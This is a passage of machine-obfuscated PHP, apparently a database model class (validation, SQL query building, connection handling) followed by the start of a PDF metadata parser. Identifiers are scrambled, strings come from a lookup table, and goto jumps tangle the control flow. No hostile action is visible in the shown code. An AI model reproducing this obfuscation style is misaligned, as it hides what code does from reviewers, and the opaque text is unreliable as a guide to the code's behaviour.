$DÑÒñŞè•ê[3] = isset($DÑÒñŞè•ê[3]) ? $DÑÒñŞè•ê[3] : THINK_EXISTS_VALIDATE; $DÑÒñŞè•ê[4] = isset($DÑÒñŞè•ê[4]) ? $DÑÒñŞè•ê[4] : $e±¬ãÄ‚ïŠ[313]; switch ($DÑÒñŞè•ê[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Fğ–½®½Õ±, $DÑÒñŞè•ê)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($e±¬ãÄ‚ïŠ[33] != trim($Fğ–½®½Õ±[$DÑÒñŞè•ê[0]])) { if (!1 === $this->_validationField($Fğ–½®½Õ±, $DÑÒñŞè•ê)) { return !1; } } break; default: if (isset($Fğ–½®½Õ±[$DÑÒñŞè•ê[0]])) { if (!1 === $this->_validationField($Fğ–½®½Õ±, $DÑÒñŞè•ê)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($A“„ßÓ„–œ, $d­à¨ŒÑ) { if (!1 === $this->_validationFieldItem($A“„ßÓ„–œ, $d­à¨ŒÑ)) { if ($this->patchValidate) { $this->error[$d­à¨ŒÑ[0]] = $d­à¨ŒÑ[2]; } else { $this->error = $d­à¨ŒÑ[2]; return !1; } } return; } protected function _validationFieldItem($bÄºéò÷àÂ, $f“Éé•ò©¨) { $FĞ£ò’©â =& $_SERVER[¼]; switch (strtolower(trim($f“Éé•ò©¨[4]))) { case $FĞ£ò’©â[306]: case $FĞ£ò’©â[307]: $CÎ‰¬µ™š = isset($f“Éé•ò©¨[6]) ? (array) $f“Éé•ò©¨[6] : array(); if (is_string($f“Éé•ò©¨[0]) && strpos($f“Éé•ò©¨[0], $FĞ£ò’©â[47])) { $f“Éé•ò©¨[0] = explode($FĞ£ò’©â[47], $f“Éé•ò©¨[0]); } if (is_array($f“Éé•ò©¨[0])) { foreach ($f“Éé•ò©¨[0] as $bÁí×áĞÙ£) { $dÉŸÚŒÊáØ[$bÁí×áĞÙ£] = $bÄºéò÷àÂ[$bÁí×áĞÙ£]; } array_unshift($CÎ‰¬µ™š, $dÉŸÚŒÊáØ); } else { array_unshift($CÎ‰¬µ™š, $bÄºéò÷àÂ[$f“Éé•ò©¨[0]]); } if ($FĞ£ò’©â[306] == $f“Éé•ò©¨[4]) { return call_user_func_array($f“Éé•ò©¨[1], $CÎ‰¬µ™š); } else { return call_user_func_array(array(&$this, $f“Éé•ò©¨[1]), $CÎ‰¬µ™š); } case $FĞ£ò’©â[314]: return $bÄºéò÷àÂ[$f“Éé•ò©¨[0]] == $bÄºéò÷àÂ[$f“Éé•ò©¨[1]]; case $FĞ£ò’©â[315]: if (is_string($f“Éé•ò©¨[0]) && strpos($f“Éé•ò©¨[0], $FĞ£ò’©â[47])) { $f“Éé•ò©¨[0] = explode($FĞ£ò’©â[47], $f“Éé•ò©¨[0]); } $C“‰†Ò†ğÔ = array(); if (is_array($f“Éé•ò©¨[0])) { foreach ($f“Éé•ò©¨[0] as $bÁí×áĞÙ£) { $C“‰†Ò†ğÔ[$bÁí×áĞÙ£] = $bÄºéò÷àÂ[$bÁí×áĞÙ£]; } } else { $C“‰†Ò†ğÔ[$f“Éé•ò©¨[0]] = $bÄºéò÷àÂ[$f“Éé•ò©¨[0]]; } if (!empty($bÄºéò÷àÂ[$this->getPk()])) { $C“‰†Ò†ğÔ[$this->getPk()] = array($FĞ£ò’©â[316], $bÄºéò÷àÂ[$this->getPk()]); } if ($this->where($C“‰†Ò†ğÔ)->find()) { return !1; } return !0; default: return $this->check($bÄºéò÷àÂ[$f“Éé•ò©¨[0]], $f“Éé•ò©¨[1], $f“Éé•ò©¨[4]); } } public function check($Eôî¶Ø‡é, $Aˆ¿¥ñ¹ŸÅ, $f—©Û±äñá = "\x72\145\147\145\x78") { $FÌ·®å§µ =& $_SERVER[¼]; $f—©Û±äñá = strtolower(trim($f—©Û±äñá)); switch ($f—©Û±äñá) { case $FÌ·®å§µ[7]: case $FÌ·®å§µ[317]: $fàê½ Í„® = is_array($Aˆ¿¥ñ¹ŸÅ) ? $Aˆ¿¥ñ¹ŸÅ : explode($FÌ·®å§µ[47], $Aˆ¿¥ñ¹ŸÅ); return $f—©Û±äñá == $FÌ·®å§µ[7] ? in_array($Eôî¶Ø‡é, $fàê½ Í„®) : !in_array($Eôî¶Ø‡é, $fàê½ Í„®); case $FÌ·®å§µ[318]: case $FÌ·®å§µ[319]: if (is_array($Aˆ¿¥ñ¹ŸÅ)) { $F×èô¡Ò³Å = $Aˆ¿¥ñ¹ŸÅ[0]; $d¾ôêéˆ = $Aˆ¿¥ñ¹ŸÅ[1]; } else { list($F×èô¡Ò³Å, $d¾ôêéˆ) = explode($FÌ·®å§µ[47], $Aˆ¿¥ñ¹ŸÅ); } return $f—©Û±äñá == $FÌ·®å§µ[318] ? $Eôî¶Ø‡é >= $F×èô¡Ò³Å && $Eôî¶Ø‡é <= $d¾ôêéˆ : $Eôî¶Ø‡é < $F×èô¡Ò³Å || $Eôî¶Ø‡é > $d¾ôêéˆ; case $FÌ·®å§µ[320]: case $FÌ·®å§µ[321]: return $f—©Û±äñá == $FÌ·®å§µ[320] ? $Eôî¶Ø‡é == $Aˆ¿¥ñ¹ŸÅ : $Eôî¶Ø‡é != $Aˆ¿¥ñ¹ŸÅ; case $FÌ·®å§µ[322]: $C‹Ú’ªßÙé = mb_strlen($Eôî¶Ø‡é, $FÌ·®å§µ[323]); if (strpos($Aˆ¿¥ñ¹ŸÅ, $FÌ·®å§µ[47])) { list($F×èô¡Ò³Å, $d¾ôêéˆ) = explode($FÌ·®å§µ[47], $Aˆ¿¥ñ¹ŸÅ); return $C‹Ú’ªßÙé >= $F×èô¡Ò³Å && $C‹Ú’ªßÙé <= $d¾ôêéˆ; } else { return $C‹Ú’ªßÙé == $Aˆ¿¥ñ¹ŸÅ; } case $FÌ·®å§µ[324]: list($Aëñ†˜µß½, $A£ìÈ×Ÿó“) = explode($FÌ·®å§µ[47], $Aˆ¿¥ñ¹ŸÅ); if (!is_numeric($Aëñ†˜µß½)) { $Aëñ†˜µß½ = strtotime($Aëñ†˜µß½); } if (!is_numeric($A£ìÈ×Ÿó“)) { $A£ìÈ×Ÿó“ = strtotime($A£ìÈ×Ÿó“); } return NOW_TIME >= $Aëñ†˜µß½ && NOW_TIME <= $A£ìÈ×Ÿó“; case $FÌ·®å§µ[325]: return in_array(get_client_ip(), explode($FÌ·®å§µ[47], $Aˆ¿¥ñ¹ŸÅ)); case $FÌ·®å§µ[326]: return !in_array(get_client_ip(), explode($FÌ·®å§µ[47], $Aˆ¿¥ñ¹ŸÅ)); case $FÌ·®å§µ[313]: default: return $this->regex($Eôî¶Ø‡é, $Aˆ¿¥ñ¹ŸÅ); } } public function query($bÖÍøÕ¸ˆğ, $E‚ºÙÊÄÙï = false) { $B†Ù‹†Ë„Ü =& $_SERVER[¼]; if (!is_bool($E‚ºÙÊÄÙï) && !is_array($E‚ºÙÊÄÙï)) { $E‚ºÙÊÄÙï = func_get_args(); array_shift($E‚ºÙÊÄÙï); } $bÖÍøÕ¸ˆğ = str_replace(array($B†Ù‹†Ë„Ü[214], $B†Ù‹†Ë„Ü[327]), $B†Ù‹†Ë„Ü[50], $bÖÍøÕ¸ˆğ); $bÖÍøÕ¸ˆğ = $this->parseSql($bÖÍøÕ¸ˆğ, $E‚ºÙÊÄÙï); return $this->db->query($bÖÍøÕ¸ˆğ); } public function execute($c®ŒÉ…ßÂ, $BØ—÷ÎÕùñ = false) { if (!is_bool($BØ—÷ÎÕùñ) && !is_array($BØ—÷ÎÕùñ)) { $BØ—÷ÎÕùñ = func_get_args(); array_shift($BØ—÷ÎÕùñ); } $c®ŒÉ…ßÂ = $this->parseSql($c®ŒÉ…ßÂ, $BØ—÷ÎÕùñ); return $this->db->execute($c®ŒÉ…ßÂ); } protected function parseSql($dÅÚ¸å—æ‘, $C½µ³¬‘¤) { $EôßÕË´£¸ =& $_SERVER[¼]; if (!0 === $C½µ³¬‘¤) { $Bºš÷âİîİ = $this->_parseOptions(); $dÅÚ¸å—æ‘ = $this->db->parseSql($dÅÚ¸å—æ‘, $Bºš÷âİîİ); } elseif (is_array($C½µ³¬‘¤)) { $C½µ³¬‘¤ = array_map(array($this->db, $EôßÕË´£¸[328]), $C½µ³¬‘¤); $dÅÚ¸å—æ‘ = vsprintf($dÅÚ¸å—æ‘, $C½µ³¬‘¤); } else { $dÅÚ¸å—æ‘ = strtr($dÅÚ¸å—æ‘, array($EôßÕË´£¸[329] => $this->getTableName(), $EôßÕË´£¸[330] => think_config($EôßÕË´£¸[229]))); } $this->db->setModel($this->name); return $dÅÚ¸å—æ‘; } public function db($FÉ¸âŠ‹„µ = '', $bºÜáİ´¬ = '', $EšÓôßÇ± = array()) { goto A”é¹ºÙÛ‡; dÎå‰âò‹: $bÌ¸Œ¬Ùƒó[$FÉ¸âŠ‹„µ] = $bºÜáİ´¬; $this->db = $FÊß°øµ®ì[$FÉ¸âŠ‹„µ]; $this->_after_db(); goto fôÂ†íàĞ; A”é¹ºÙÛ‡: $e†™¤ğ®â¶ =& $_SERVER[¼]; if ($e†™¤ğ®â¶[33] === $FÉ¸âŠ‹„µ && $this->db) { return $this->db; } static $bÌ¸Œ¬Ùƒó = array(); goto F´œ‹—ù¥Œ; fôÂ†íàĞ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto eçÓÆÙù‰ê; F´œ‹—ù¥Œ: static $FÊß°øµ®ì = array(); if (!isset($FÊß°øµ®ì[$FÉ¸âŠ‹„µ]) || isset($FÊß°øµ®ì[$FÉ¸âŠ‹„µ]) && $bºÜáİ´¬ && $bÌ¸Œ¬Ùƒó[$FÉ¸âŠ‹„µ] != $bºÜáİ´¬) { if (!empty($bºÜáİ´¬) && is_string($bºÜáİ´¬) && !1 === strpos($bºÜáİ´¬, $e†™¤ğ®â¶[8])) { $bºÜáİ´¬ = think_config($bºÜáİ´¬); } $FÊß°øµ®ì[$FÉ¸âŠ‹„µ] = Db::getInstance($bºÜáİ´¬); } elseif (NULL === $bºÜáİ´¬) { $FÊß°øµ®ì[$FÉ¸âŠ‹„µ]->close(); unset($FÊß°øµ®ì[$FÉ¸âŠ‹„µ]); return; } if (!empty($EšÓôßÇ±)) { if (is_string($EšÓôßÇ±)) { parse_str($EšÓôßÇ±, $EšÓôßÇ±); } foreach ($EšÓôßÇ± as $bò´İÔ‚Ùè => $b´ÖˆğÉ¢) { $this->setProperty($bò´İÔ‚Ùè, $b´ÖˆğÉ¢); } } goto dÎå‰âò‹; eçÓÆÙù‰ê: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $A¸‹ò„´ÅŸ = get_class($this); if ($A¸‹ò„´ÅŸ == $_SERVER[¼][331]) { return $this->name; } $this->name = substr($A¸‹ò„´ÅŸ, 0, -5); } return $this->name; } public function getTableName() { $AÊéø†‡‚† =& $_SERVER[¼]; if (empty($this->trueTableName)) { $böÃ¸òÇ = !empty($this->tablePrefix) ? $this->tablePrefix : $AÊéø†‡‚†[33]; if (!empty($this->tableName)) { $böÃ¸òÇ .= $this->tableName; } else { $böÃ¸òÇ .= think_parse_name($this->name); } $this->trueTableName = strtolower($böÃ¸òÇ); } return (!empty($this->dbName) ? $this->dbName . $AÊéø†‡‚†[93] : $AÊéø†‡‚†[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $BœÒÏ”ˆÇÍ =& $_SERVER[¼]; return isset($this->fields[$BœÒÏ”ˆÇÍ[236]]) ? $this->fields[$BœÒÏ”ˆÇÍ[236]] : $this->pk; } public function getDbFields() { $fù§Ùõ×‘ =& $_SERVER[¼]; if (isset($this->options[$fù§Ùõ×‘[264]])) { $b†—¨éæ’¿ = $this->db->getFields($this->options[$fù§Ùõ×‘[264]]); return $b†—¨éæ’¿ ? array_keys($b†—¨éæ’¿) : !1; } if ($this->fields) { $b†—¨éæ’¿ = $this->fields; unset($b†—¨éæ’¿[$fù§Ùõ×‘[235]], $b†—¨éæ’¿[$fù§Ùõ×‘[236]], $b†—¨éæ’¿[$fù§Ùõ×‘[237]], $b†—¨éæ’¿[$fù§Ùõ×‘[234]]); return $b†—¨éæ’¿; } return !1; } public function data($aĞ‡ÊÂŞ¡± = '') { $B½•§È®éó =& $_SERVER[¼]; if ($B½•§È®éó[33] === $aĞ‡ÊÂŞ¡± && !empty($this->data)) { return $this->data; } if (is_object($aĞ‡ÊÂŞ¡±)) { $aĞ‡ÊÂŞ¡± = get_object_vars($aĞ‡ÊÂŞ¡±); } elseif (is_string($aĞ‡ÊÂŞ¡±)) { parse_str($aĞ‡ÊÂŞ¡±, $aĞ‡ÊÂŞ¡±); } elseif (!is_array($aĞ‡ÊÂŞ¡±)) { think_exception(think_lang($B½•§È®éó[256])); } $this->data = $aĞ‡ÊÂŞ¡±; return $this; } public function join($bŸ¹æÖ×ñÊ) { $A”å¹“×±Â =& $_SERVER[¼]; if (is_array($bŸ¹æÖ×ñÊ)) { $this->options[$A”å¹“×±Â[267]] = $bŸ¹æÖ×ñÊ; } elseif (!empty($bŸ¹æÖ×ñÊ)) { $this->options[$A”å¹“×±Â[267]][] = $bŸ¹æÖ×ñÊ; } return $this; } public function union($aôí‹çäŞ, $DÆÀğÏ’Ã« = false) { goto f§³‘Ñ•¼; DŒ¹ÁÈ: if (is_object($aôí‹çäŞ)) { $aôí‹çäŞ = get_object_vars($aôí‹çäŞ); } if (is_string($aôí‹çäŞ)) { $D‡òÀÛ’¤ = $aôí‹çäŞ; } elseif (is_array($aôí‹çäŞ)) { if (isset($aôí‹çäŞ[0])) { $this->options[$c†õÛÁÂ¼Å[332]] = array_merge($this->options[$c†õÛÁÂ¼Å[332]], $aôí‹çäŞ); return $this; } else { $D‡òÀÛ’¤ = $aôí‹çäŞ; } } else { think_exception(think_lang($c†õÛÁÂ¼Å[256])); } $this->options[$c†õÛÁÂ¼Å[332]][] = $D‡òÀÛ’¤; goto f÷çÏó Š; f÷çÏó Š: return $this; goto EšÎŠçˆªØ; f§³‘Ñ•¼: $c†õÛÁÂ¼Å =& $_SERVER[¼]; if (empty($aôí‹çäŞ)) { return $this; } if ($DÆÀğÏ’Ã«) { $this->options[$c†õÛÁÂ¼Å[332]][$c†õÛÁÂ¼Å[333]] = !0; } goto DŒ¹ÁÈ; EšÎŠçˆªØ: } public function cache($Aï¯¦ÊØŞï = true, $A´Á™¼®À = null, $AÒù÷–µ¡ƒ = '') { $Eøª®¢“àÄ =& $_SERVER[¼]; if (!1 !== $Aï¯¦ÊØŞï) { $this->options[$Eøª®¢“àÄ[334]] = array($Eøª®¢“àÄ[89] => $Aï¯¦ÊØŞï, $Eøª®¢“àÄ[324] => $A´Á™¼®À, $Eøª®¢“àÄ[29] => $AÒù÷–µ¡ƒ); } return $this; } public function field($A¤“çÂ¿‰Ó, $cÜš’ãƒê¾ = false) { $AõÀ¾ŸÂÍ› =& $_SERVER[¼]; if (!0 === $A¤“çÂ¿‰Ó) { $f…İ“ÈŒÀó = $this->getDbFields(); $A¤“çÂ¿‰Ó = $f…İ“ÈŒÀó ? $f…İ“ÈŒÀó : $AõÀ¾ŸÂÍ›[173]; } elseif ($cÜš’ãƒê¾) { if (is_string($A¤“çÂ¿‰Ó)) { $A¤“çÂ¿‰Ó = explode($AõÀ¾ŸÂÍ›[47], $A¤“çÂ¿‰Ó); } $f…İ“ÈŒÀó = $this->getDbFields(); $A¤“çÂ¿‰Ó = $f…İ“ÈŒÀó ? array_diff($f…İ“ÈŒÀó, $A¤“çÂ¿‰Ó) : $A¤“çÂ¿‰Ó; } $this->options[$AõÀ¾ŸÂÍ›[258]] = $A¤“çÂ¿‰Ó; return $this; } public function scope($Bñ–´¾Š‰¦ = '', $DœíåŠ²ï¨ = NULL) { $cÒ›’¬¾ÈŸ =& $_SERVER[¼]; if ($cÒ›’¬¾ÈŸ[33] === $Bñ–´¾Š‰¦) { if (isset($this->_scope[$cÒ›’¬¾ÈŸ[34]])) { $DìÄÇº™å = $this->_scope[$cÒ›’¬¾ÈŸ[34]]; } else { return $this; } } elseif (is_string($Bñ–´¾Š‰¦)) { $Cëô÷¬£©ª = explode($cÒ›’¬¾ÈŸ[47], $Bñ–´¾Š‰¦); $DìÄÇº™å = array(); foreach ($Cëô÷¬£©ª as $d¬¢ÙŒÆ™á) { if (!isset($this->_scope[$d¬¢ÙŒÆ™á])) { continue; } $DìÄÇº™å = array_merge($DìÄÇº™å, $this->_scope[$d¬¢ÙŒÆ™á]); } if (!empty($DœíåŠ²ï¨) && is_array($DœíåŠ²ï¨)) { $DìÄÇº™å = array_merge($DìÄÇº™å, $DœíåŠ²ï¨); } } elseif (is_array($Bñ–´¾Š‰¦)) { $DìÄÇº™å = $Bñ–´¾Š‰¦; } if (is_array($DìÄÇº™å) && !empty($DìÄÇº™å)) { $this->options = array_merge($this->options, array_change_key_case($DìÄÇº™å)); } return $this; } public function where($E‰ÎÎ‘¯µ, $cê¡´•® = null) { $eÃİ¡íĞ®÷ =& $_SERVER[¼]; if (!is_null($cê¡´•®) && is_string($E‰ÎÎ‘¯µ)) { if (!is_array($cê¡´•®)) { $cê¡´•® = func_get_args(); array_shift($cê¡´•®); } $cê¡´•® = array_map(array($this->db, $eÃİ¡íĞ®÷[328]), $cê¡´•®); $E‰ÎÎ‘¯µ = vsprintf($E‰ÎÎ‘¯µ, $cê¡´•®); } elseif (is_object($E‰ÎÎ‘¯µ)) { $E‰ÎÎ‘¯µ = get_object_vars($E‰ÎÎ‘¯µ); } elseif (is_array($E‰ÎÎ‘¯µ)) { foreach ($E‰ÎÎ‘¯µ as $EÖÌˆæô => $f„ËÅöè…) { if ((is_numeric($EÖÌˆæô) || !$EÖÌˆæô) && is_string($f„ËÅöè…)) { think_trace($eÃİ¡íĞ®÷[335], $eÃİ¡íĞ®÷[33], $eÃİ¡íĞ®÷[46]); die; } } } if (is_string($E‰ÎÎ‘¯µ) && $eÃİ¡íĞ®÷[33] != $E‰ÎÎ‘¯µ) { $a¤ƒÏ‹¥íÍ = array(); $a¤ƒÏ‹¥íÍ[$eÃİ¡íĞ®÷[336]] = $E‰ÎÎ‘¯µ; $E‰ÎÎ‘¯µ = $a¤ƒÏ‹¥íÍ; } if (isset($this->options[$eÃİ¡íĞ®÷[260]])) { $this->options[$eÃİ¡íĞ®÷[260]] = array_merge($this->options[$eÃİ¡íĞ®÷[260]], $E‰ÎÎ‘¯µ); } else { $this->options[$eÃİ¡íĞ®÷[260]] = $E‰ÎÎ‘¯µ; } return $this; } public function limit($F¥ôöçŠÈ¦, $EÒ¿˜ÚÒ = null) { $fÓ–´Å³ =& $_SERVER[¼]; $this->options[$fÓ–´Å³[277]] = is_null($EÒ¿˜ÚÒ) ? $F¥ôöçŠÈ¦ : $F¥ôöçŠÈ¦ . $fÓ–´Å³[47] . $EÒ¿˜ÚÒ; return $this; } public function page($eÊ†ÎÙŒøí, $Cò¡¿ÖîØ­ = null) { $Aâ¥º¨¶™ =& $_SERVER[¼]; $this->options[$Aâ¥º¨¶™[337]] = is_null($Cò¡¿ÖîØ­) ? $eÊ†ÎÙŒøí : $eÊ†ÎÙŒøí . $Aâ¥º¨¶™[47] . $Cò¡¿ÖîØ­; return $this; } public function comment($bàÓè–‡Å) { $this->options[$_SERVER[¼][338]] = $bàÓè–‡Å; return $this; } public function setProperty($C·Ş™ƒ–ç‰, $bÒÁ•ŞÈİë) { if (property_exists($this, $C·Ş™ƒ–ç‰)) { $this->{$C·Ş™ƒ–ç‰} = $bÒÁ•ŞÈİë; } return $this; } } goto d¡šœ…¿ù; e‘¶Ö Ï›: class FileParsePdf { public static function parse($DÃ¥ˆè•) { goto FÉ¬ƒÖËƒ; f†ˆ‰™¸: $c‰ê…ô„·³[$B‚À±˜×òœ[1496]] = StreamWrapperIO::read($DÃ¥ˆè•, 0, $aÚÅ¶çêÁ); $c‰ê…ô„·³[$B‚À±˜×òœ[1497]] = StreamWrapperIO::read($DÃ¥ˆè•, $c‰ê…ô„·³[$B‚À±˜×òœ[77]] - $aÚÅ¶çêÁ, $aÚÅ¶çêÁ); $e¼Ä„åÛ¥± = self::decodeXref($c‰ê…ô„·³); goto A›“÷—¨Õ; d¤¦ëÓŠ·: preg_match_all($FÛ¯Ä†Ÿ, $c‰ê…ô„·³[$B‚À±˜×òœ[1496]], $C……»ÌçŸ); if ($C……»ÌçŸ[1] && $D–ìäÕĞ£à[$B‚À±˜×òœ[1503]] < $C……»ÌçŸ[1][0]) { $D–ìäÕĞ£à[$B‚À±˜×òœ[1503]] = $C……»ÌçŸ[1][0]; } preg_match_all($FÛ¯Ä†Ÿ, $c‰ê…ô„·³[$B‚À±˜×òœ[1497]], $C……»ÌçŸ); goto EîË³ø±ÁÔ; Cëˆî¤Òæ¢: preg_match($FÛ¯Ä†Ÿ, $c‰ê…ô„·³[$B‚À±˜×òœ[1497]], $C……»ÌçŸ); if (!$D–ìäÕĞ£à[$B‚À±˜×òœ[1499]] && count($C……»ÌçŸ) == 5) { $D–ìäÕĞ£à[$B‚À±˜×òœ[1499]] = $C……»ÌçŸ[3]; $D–ìäÕĞ£à[$B‚À±˜×òœ[1501]] = $C……»ÌçŸ[4]; } preg_match($B‚À±˜×òœ[1502], $c‰ê…ô„·³[$B‚À±˜×òœ[1496]], $C……»ÌçŸ); goto aŞ±×í¼¼¬; aŞ±×í¼¼¬: if ($C……»ÌçŸ) { $D–ìäÕĞ£à[$B‚À±˜×òœ[1311]] = $C……»ÌçŸ[1]; } $D–ìäÕĞ£à[$B‚À±˜×òœ[1503]] = 0; $FÛ¯Ä†Ÿ = $B‚À±˜×òœ[1504]; goto d¤¦ëÓŠ·; FÉ¬ƒÖËƒ: $B‚À±˜×òœ =& $_SERVER[¼]; $aÚÅ¶çêÁ = 32 * 1024; $c‰ê…ô„·³ = array($B‚À±˜×òœ[775] => fopen($DÃ¥ˆè•, $B‚À±˜×òœ[1155]), $B‚À±˜×òœ[75] => $DÃ¥ˆè•, $B‚À±˜×òœ[77] => filesize($DÃ¥ˆè•), $B‚À±˜×òœ[1495] => $aÚÅ¶çêÁ); goto f†ˆ‰™¸; A›“÷—¨Õ: if ($e¼Ä„åÛ¥±) { $D…ŒÊğàÜ† = $e¼Ä„åÛ¥±[$B‚À±˜×òœ[1498]][$B‚À±˜×òœ[1177]]; $D–ìäÕĞ£à = self::getObjectValue($c‰ê…ô„·³, $e¼Ä„åÛ¥±, $D…ŒÊğàÜ†); } $D–ìäÕĞ£à = is_array($D–ìäÕĞ£à) ? $D–ìäÕĞ£à : array(); $D–ìäÕĞ£à[$B‚À±˜×òœ[1499]] = 0; goto C½Åƒâàå; C½Åƒâàå: $FÛ¯Ä†Ÿ = $B‚À±˜×òœ[1500]; preg_match($FÛ¯Ä†Ÿ, $c‰ê…ô„·³[$B‚À±˜×òœ[1496]], $C……»ÌçŸ); if (!$D–ìäÕĞ£à[$B‚À±˜×òœ[1499]] && count($C……»ÌçŸ) == 5) { $D–ìäÕĞ£à[$B‚À±˜×òœ[1499]] = $C……»ÌçŸ[3]; $D–ìäÕĞ£à[$B‚À±˜×òœ[1501]] = $C……»ÌçŸ[4]; } goto Cëˆî¤Òæ¢; EîË³ø±ÁÔ: if ($C……»ÌçŸ[1] && $D–ìäÕĞ£à[$B‚À±˜×òœ[1503]] < $C……»ÌçŸ[1][0]) { $D–ìäÕĞ£à[$B‚À±˜×òœ[1503]] = $C……»ÌçŸ[1][0]; } $D–ìäÕĞ£à = self::parseInfoItem($D–ìäÕĞ£à); return $D–ìäÕĞ£à; goto DÆòİ©ÏË¦; DÆòİ©ÏË¦: } private static function parseInfoItem($fö¨îİ«·®) { $B…Ç°İóÜ =& $_SERVER[¼]; if (!$fö¨îİ«·®) { return !1; } $FÒ¾¨£ºíï = array($B…Ç°İóÜ[1312] => array($B…Ç°İóÜ[1505], $B…Ç°İóÜ[33]), $B…Ç°İóÜ[1506] => array($B…Ç°İóÜ[1507], $B…Ç°İóÜ[33]), $B…Ç°İóÜ[184] => array($B…Ç°İóÜ[1508], $B…Ç°İóÜ[207]), $B…Ç°İóÜ[107] => array($B…Ç°İóÜ[1509], $B…Ç°İóÜ[207]), $B…Ç°İóÜ[1503] => array($B…Ç°İóÜ[1503], $B…Ç°İóÜ[273]), $B…Ç°İóÜ[1499] => array($B…Ç°İóÜ[1499], $B…Ç°İóÜ[273]), $B…Ç°İóÜ[1501] => array($B…Ç°İóÜ[1501], $B…Ç°İóÜ[273]), $B…Ç°İóÜ[1510] => array($B…Ç°İóÜ[1511], $B…Ç°İóÜ[33]), $B…Ç°İóÜ[1512] => array($B…Ç°İóÜ[1513], $B…Ç°İóÜ[33]), $B…Ç°İóÜ[1514] => array($B…Ç°İóÜ[1311], $B…Ç°İóÜ[33])); $bà©¦ÖÛ = array(); foreach ($FÒ¾¨£ºíï as $a™áßŒ÷È => $e‚­®×ïí) { if (!isset($fö¨îİ«·®[$e‚­®×ïí[0]])) { continue; } $cºÅµÑô = $fö¨îİ«·®[$e‚­®×ïí[0]]; if (!$cºÅµÑô || is_array($cºÅµÑô)) { continue; } switch ($e‚­®×ïí[1]) { case $B…Ç°İóÜ[273]: $cºÅµÑô = intval($cºÅµÑô); break; case $B…Ç°İóÜ[207]: if (substr($cºÅµÑô, 0, 2) == $B…Ç°İóÜ[1515]) { $cºÅµÑô = substr($cºÅµÑô, 2, 14); } if (strtotime($cºÅµÑô)) { $cºÅµÑô = date($B…Ç°İóÜ[1516], strtotime($cºÅµÑô)); } break; } $bà©¦ÖÛ[$a™áßŒ÷È] = $cºÅµÑô; } return $bà©¦ÖÛ; } private static function decodeXref(&$f®§æ”‘Á) { goto EµÜ¸…‹Óˆ; fôë…ÀÀ: if (preg_match($F§›´˜œ—[1529], $C’çËÏÈ”‘, $a÷’‘—à·) > 0) { $cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1498]][$F§›´˜œ—[1177]] = intval($a÷’‘—à·[1]) . $F§›´˜œ—[70] . intval($a÷’‘—à·[2]); } if (preg_match($F§›´˜œ—[1530], $C’çËÏÈ”‘, $a÷’‘—à·) > 0) { $cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1498]][$F§›´˜œ—[364]] = array(); $cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1498]][$F§›´˜œ—[364]][0] = $a÷’‘—à·[1]; $cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1498]][$F§›´˜œ—[364]][1] = $a÷’‘—à·[2]; } if (!$cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1498]][$F§›´˜œ—[1177]]) { return !1; } goto eğ“ñ®‘ˆ; BÀ¹™ß½äÀ: $FäíõÕïâ  = $F§›´˜œ—[1518]; if (!preg_match_all($FäíõÕïâ , $a‘Úó†åÀ¾, $a÷’‘—à·, PREG_SET_ORDER, 0)) { return !1; } $CÖÅò½·ù = intval($a÷’‘—à·[0][1]); goto eˆ¶Ò¦­ìœ; cöÌƒá’•Ó: foreach ($a÷’‘—à·[3] as $e¸–¡Ÿ¡Ñ => $Eé¢ÇÛÇ±) { if ($a÷’‘—à·[3][$e¸–¡Ÿ¡Ñ] == $F§›´˜œ—[1520]) { $bÍ“­“ ¦ô = $dù¯ê¢çÉá . $F§›´˜œ—[70] . intval($a÷’‘—à·[2][$e¸–¡Ÿ¡Ñ]); $cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1517]][$bÍ“­“ ¦ô] = intval($a÷’‘—à·[1][$e¸–¡Ÿ¡Ñ]); ++$dù¯ê¢çÉá; } else { if ($a÷’‘—à·[3][$e¸–¡Ÿ¡Ñ] == $F§›´˜œ—[1521]) { ++$dù¯ê¢çÉá; } else { } } } if (preg_match_all($F§›´˜œ—[1522], $a‘Úó†åÀ¾, $a÷’‘—à·)) { $dÑö‹ğ³ÅÎ = $f®§æ”‘Á[$F§›´˜œ—[77]] - $f®§æ”‘Á[$F§›´˜œ—[1495]]; foreach ($a÷’‘—à·[0] as $e¸–¡Ÿ¡Ñ => $e™ªøÔİ‘Ä) { $e©ƒà±ôß = $a÷’‘—à·[1][$e¸–¡Ÿ¡Ñ] . $F§›´˜œ—[70] . $a÷’‘—à·[2][$e¸–¡Ÿ¡Ñ]; $cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1517]][$e©ƒà±ôß] = strpos($a‘Úó†åÀ¾, $e™ªøÔİ‘Ä) + $dÑö‹ğ³ÅÎ + 1; } } if (preg_match_all($F§›´˜œ—[1523], $a‘Úó†åÀ¾, $a÷’‘—à·)) { $C’çËÏÈ”‘ = count($a÷’‘—à·[1]) == 1 ? $a÷’‘—à·[1][0] : $a÷’‘—à·[1][1]; } else { $C’çËÏÈ”‘ = substr($a‘Úó†åÀ¾, -1024 * 5); } goto A­¨ùâÍÇ; eğ“ñ®‘ˆ: if (preg_match($F§›´˜œ—[1531], $C’çËÏÈ”‘, $a÷’‘—à·) > 0) { } return $cŒ§ÎÈŒ‘ª; goto càÈÅöÌÕÅ; A­¨ùâÍÇ: if (preg_match($F§›´˜œ—[1524], $C’çËÏÈ”‘, $a÷’‘—à·) > 0) { $cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1498]][$F§›´˜œ—[77]] = intval($a÷’‘—à·[1]); } if (preg_match($F§›´˜œ—[1525], $C’çËÏÈ”‘, $a÷’‘—à·) > 0) { 